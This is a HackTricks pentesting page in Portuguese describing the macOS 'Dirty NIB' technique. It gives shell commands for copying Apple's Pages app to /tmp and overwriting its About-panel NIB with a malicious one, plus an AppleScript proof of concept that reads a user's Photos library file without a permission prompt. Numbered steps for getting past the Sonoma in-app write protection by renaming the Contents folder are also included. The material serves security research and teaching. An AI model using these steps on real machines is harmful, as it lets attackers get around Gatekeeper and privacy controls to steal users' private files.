# macOS Dirty NIB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta técnica foi retirada do post** [**https://blog.xpnsec.com/dirtynib/**](https://blog.xpnsec.com/dirtynib/)

## Informações Básicas

Os arquivos NIB são usados no ecossistema de desenvolvimento da Apple para **definir elementos de interface do usuário (UI)** e suas interações dentro de um aplicativo. Criados com a ferramenta Interface Builder, eles contêm **objetos serializados** como janelas, botões e campos de texto, que são carregados em tempo de execução para apresentar a UI projetada. Embora ainda em uso, a Apple tem recomendado o uso de Storyboards para uma representação mais visual do fluxo da UI de um aplicativo.

{% hint style="danger" %}
Além disso, os **arquivos NIB** também podem ser usados para **executar comandos arbitrários** e se o arquivo NIB for modificado em um aplicativo, o **Gatekeeper ainda permitirá a execução do aplicativo**, então eles podem ser usados para **executar comandos arbitrários dentro de aplicativos**.
{% endhint %}

## Injeção de NIB Sujo <a href="#dirtynib" id="dirtynib"></a>

Primeiro, precisamos criar um novo arquivo NIB, usaremos o XCode para a maior parte da construção. Começamos adicionando um objeto à interface e definimos a classe como NSAppleScript:

<figure><img src="../../../.gitbook/assets/image (681).png" alt="" width="380"><figcaption></figcaption></figure>

Para o objeto, precisamos definir a propriedade `source` inicial, o que podemos fazer usando Atributos de Tempo de Execução Definidos pelo Usuário:

<figure><img src="../../../.gitbook/assets/image (682).png" alt="" width="563"><figcaption></figcaption></figure>

Isso configura nosso gadget de execução de código, que apenas vai **executar AppleScript sob demanda**. Para realmente acionar a execução do AppleScript, vamos adicionar um botão por enquanto (você pode, é claro, ser criativo com isso ;). O botão será vinculado ao objeto `Apple Script` que acabamos de criar e **invocará o seletor `executeAndReturnError:`**:

<figure><img src="../../../.gitbook/assets/image (683).png" alt="" width="563"><figcaption></figcaption></figure>

Para testar, usaremos apenas o Apple Script:
```bash
set theDialogText to "PWND"
display dialog theDialogText
```
E se executarmos isso no depurador do XCode e clicarmos no botão:

<figure><img src="../../../.gitbook/assets/image (684).png" alt="" width="563"><figcaption></figcaption></figure>

Com nossa capacidade de executar código AppleScript arbitrário a partir de um NIB, em seguida, precisamos de um alvo. Vamos escolher o Pages para nossa demonstração inicial, que é, é claro, um aplicativo da Apple e certamente não deve ser modificável por nós.

Primeiro, faremos uma cópia do aplicativo em `/tmp/`:
```bash
cp -a -X /Applications/Pages.app /tmp/
```
Em seguida, vamos iniciar o aplicativo para evitar problemas com o Gatekeeper e permitir que as coisas sejam armazenadas em cache:
```bash
open -W -g -j /Applications/Pages.app
```
Depois de executar (e encerrar) o aplicativo pela primeira vez, precisaremos substituir um arquivo NIB existente pelo nosso arquivo DirtyNIB. Para fins de demonstração, vamos apenas substituir o NIB do Painel Sobre para que possamos controlar a execução:
```bash
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```
Uma vez que tenhamos sobrescrito o nib, podemos acionar a execução selecionando o item de menu `Sobre`:

<figure><img src="../../../.gitbook/assets/image (685).png" alt="" width="563"><figcaption></figcaption></figure>

Se olharmos mais de perto o Pages, veremos que ele possui uma autorização privada para permitir o acesso às fotos dos usuários:

<figure><img src="../../../.gitbook/assets/image (686).png" alt="" width="479"><figcaption></figcaption></figure>

Portanto, podemos testar nosso POC **modificando nosso AppleScript para roubar fotos** do usuário sem solicitar permissão:

{% code overflow="wrap" %}
```applescript
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```
{% endcode %}

{% hint style="danger" %}
[**Exemplo de arquivo .xib malicioso que executa código arbitrário.**](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4)
{% endhint %}

## Restrições de Lançamento

Basicamente, **impedem a execução de aplicativos fora de suas localizações esperadas**, então se você copiar um aplicativo protegido por Restrições de Lançamento para `/tmp`, você não poderá executá-lo.\
[**Encontre mais informações neste post**](../macos-security-protections/#launch-constraints)**.**

No entanto, ao analisar o arquivo **`/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4`**, você ainda pode encontrar **aplicativos que não estão protegidos por Restrições de Lançamento**, então ainda é possível **injetar** arquivos **NIB** em locais arbitrários nesses aplicativos (verifique o link anterior para aprender como encontrar esses aplicativos).

## Proteções Extras

A partir do macOS Somona, existem algumas proteções **impedindo a gravação dentro dos aplicativos**. No entanto, ainda é possível contornar essa proteção se, antes de executar sua cópia do binário, você alterar o nome da pasta Contents:

1. Faça uma cópia do `CarPlay Simulator.app` para `/tmp/`
2. Renomeie `/tmp/Carplay Simulator.app/Contents` para `/tmp/CarPlay Simulator.app/NotCon`
3. Execute o binário `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` para armazenar em cache dentro do Gatekeeper
4. Substitua `NotCon/Resources/Base.lproj/MainMenu.nib` pelo nosso arquivo `Dirty.nib`
5. Renomeie para `/tmp/CarPlay Simulator.app/Contents`
6. Execute `CarPlay Simulator.app` novamente

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
